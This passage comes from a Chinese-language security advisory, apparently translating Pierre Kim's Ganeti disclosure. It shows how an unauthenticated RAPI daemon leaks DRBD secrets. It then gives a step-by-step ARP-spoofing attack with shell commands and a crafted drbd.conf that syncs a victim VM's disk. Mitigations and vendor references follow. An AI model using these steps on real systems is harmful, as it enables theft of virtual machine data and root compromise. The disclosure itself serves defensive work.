        }
        _remote_host {
            address                 ipv4 10.105.1.201:11000;
        }
        _this_host {
            address                 ipv4 10.105.1.200:11000;
            volume 0 {
                device                      minor 0;
                disk                        "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data";
                meta-disk                   "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta";
                disk {
                    size                    8388608s; # bytes
                    resync-rate             61440k; # bytes/second
                }
           }
        }
    }
    root@debian-01:~#
在对这些数据进行进一步的分析之后，我们发现，其中有一个作业文件包含有DRBD配置信息：
    [...]
      'drbd_info' => {
                       'port' => 11000,
                       'primary_minor' => 0,
                       'secondary_node' => 'debian-02',
                       'secondary_minor' => 0,
                       'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
                       'primary_node' => 'debian-01'
                     },
    [...]
如果你想了解更多有关这一部分的信息，请点击下列地址进行查看：[http://docs.ganeti.org/ganeti/current/html/security.html](http://docs.ganeti.org/ganeti/current/html/security.html)
现在，我们已经在未经身份验证的情况下成功地恢复了DRBD的密钥，其使用的端口，以及相应节点了。除此之外，还有一些其他的文件，这些文件还有VLM
VG以及LVM VG名称！这些信息已经足够我们使用了，现在就让我们从一名攻击者的角度来利用这些信息，看看我们到底能对DRBD做些什么吧！
**3．DRBD悲剧了**
得到虚拟机的文件系统信息：
对同一局域网进行ARP欺骗：
通过ARP欺骗，我们可以将自己的IP地址伪装成10.105.1.201，并且还有一个有效的drbd.conf配置文件可供使用（多亏了RAPI守护进程所提供的配置参数）：
    root@kali# cat etc-drbd.conf
    include "drbd.d/global_common.conf";
    include "drbd.d/*.res";
    resource resource0 {
        volume 0 {
           device minor 0;
           disk                        "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data";
           meta-disk                   "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta";
        }
        protocol C;
        net {
            cram-hmac-alg           "md5";
            shared-secret           "eb1fe92b20aef58ed0570df49a38f82cf5a72d06";
            after-sb-0pri           discard-zero-changes;
            after-sb-1pri           consensus;
        }
        on target {
            address    10.105.1.200:11000;
        }
        on kali {
            address    10.105.1.201:11000;
        }
    }
    root@kali# vgremove xenvg-vg 2>/dev/null
    root@kali# dd if=/dev/zero of=/dev/sdb bs=1024 count=1024
    root@kali# pvcreate /dev/sdb
    root@kali# vgcreate xenvg-vg /dev/sdb
    root@kali# lvcreate --name 41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data --size 4G xenvg-vg
    root@kali# lvcreate --name 41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta --size 128M xenvg-vg
    root@kali# cp etc-drbd.conf /etc/drbd.conf
    root@kali# drbdadm create-md resource0
    root@kali# drbdadm up resource0
     || root@kali# ifconfig eth0 10.105.1.201 netmask 255.255.255.0
    root@kali# drbdadm attach resource0
    root@kali# drbdadm connect resource0
    root@kali# cat /proc/drbd
    version: 8.4.3 (api:1/proto:86-101)
    srcversion: 1A9F77B1CA5FF92235C2213 
     0: cs:SyncTarget ro:Secondary/Primary ds:Inconsistent/UpToDate C r-----        ns:0 nr:916568 dw:916472 dr:0 al:0 bm:55 lo:2 pe:0 ua:2 ap:0 ep:1 wo:f oos:3277832
            [===>................] sync'ed: 22.0% (3277832/4194304)K
            finish: 0:08:33 speed: 6,368 (5,912) want: 4,520 K/sec
    root@kali# echo "wow synchronisation in progress !"
    wow synchronisation in progress !
    root@kali#
经过十分钟的同步处理之后，攻击者就可以使用DRBD拷贝功能得到目标虚拟机文件系统中的所有文件拷贝了。
当然了，攻击者也可以向文件系统中写入信息（例如添加SSH密钥）。通过添加ssh密钥，并运行s/PermitRootLogin
No/PermitRootLogin Yes/命令，就可以对虚拟机进行root，这一部分将作为练习留给读者自行摸索。
实现中间人攻击的其它方法也将作为练习，留给读者自行学习和摸索。
**安全研究专家提出的解决方案**
首先，我认为为了提高Ganeti的安全性，以下这些步骤是必须要完成的：
1/强制RAPI守护进程监听127.0.0.1，而不是监听0.0.0.0。
我们可以在/etc/default/ganeti目录中向配置文件添加下列代码来实现：
RAPI_ARGS="-b 127.0.0.1"
2/为RAPI守护进程添加身份验证功能（不仅对文件系统进行写操作时需要进行身份验证，对系统进行读操作时同样需要进行身份验证）。
3/对进程作业的输出数据进行过滤，以防止其泄漏密钥等敏感数据。
请注意，用户需要立即采取的措施就是更换DRBD当前所使用的密钥，并且确认当前没有人正在访问DRBD数据块。
4/禁用SSL协商，并更新系统的初始密码。
我个人认为：由于部署一个能够正常工作的Ganeti平台是非常复杂的，攻击者如果在此之前没有对Ganeti平台进行深入的研究和学习，那么他肯定会放弃对你的平台进行攻击
🙂
**供应商对此事的回应**
将Ganeti升级到最新版本。
如果用户需要了解具体的缓解方案，请访问下列地址：
[https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg](https://groups.google.com/forum/%23!topic/ganeti/9bLyzwmmvdg)
**漏洞发现者**
这些漏洞是由Pierre Kim（[@PierreKimSec](https://twitter.com/PierreKimSec)）发现的。
**致谢**
非常感谢我的朋友Alexandre Torres，Jordan， Jerome以及Stephen给我提供的帮助。
感谢谷歌安全团队，感谢他们在解决这一问题的过程中所作出的努力。
**参考文档**
[https://pierrekim.github.io/advisories/2016-ganeti-0x00.txt](https://pierrekim.github.io/advisories/2016-ganeti-0x00.txt)
[https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html](https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html)
[http://www.ocert.org/advisories/ocert-2015-012.html](http://www.ocert.org/advisories/ocert-2015-012.html)
[https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg](https://groups.google.com/forum/%23!topic/ganeti/9bLyzwmmvdg)
**PoC－GHETTO-BLASTER**
概念验证示例可以从下列地址中获取：
[https://pierrekim.github.io/advisories/GHETTO-BLASTER](https://pierrekim.github.io/advisories/GHETTO-BLASTER)